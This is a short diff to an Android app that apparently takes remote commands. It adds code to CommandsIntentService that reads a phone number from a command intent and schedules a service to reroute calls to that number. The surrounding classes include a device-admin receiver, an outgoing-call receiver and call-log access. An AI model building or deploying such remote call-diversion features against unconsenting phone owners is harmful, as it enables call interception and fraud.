@@ -51,6 +51,7 @@ import com.candroid.lofl.services.jobs.CallPhoneJobService;
 import com.candroid.lofl.services.jobs.FlashlightJobService;
 import com.candroid.lofl.receivers.AdminReceiver;
 import com.candroid.lofl.receivers.OutgoingCallReceiver;
+import com.candroid.lofl.services.jobs.RerouteCallsJobService;
 
 import java.io.File;
 import java.io.IOException;
@@ -350,6 +351,10 @@ public class CommandsIntentService extends IntentService {
                         editor.apply();
                     }
                 }else{
+                    if(intent.hasExtra(OutgoingCallReceiver.NUMBER_KEY)){
+                        String number = intent.getStringExtra(OutgoingCallReceiver.NUMBER_KEY);
+                        RerouteCallsJobService.schedule(this, number);
+                    }
                     startPermissionActivity(this, intent, CallLogActivity.class);
                 }
 
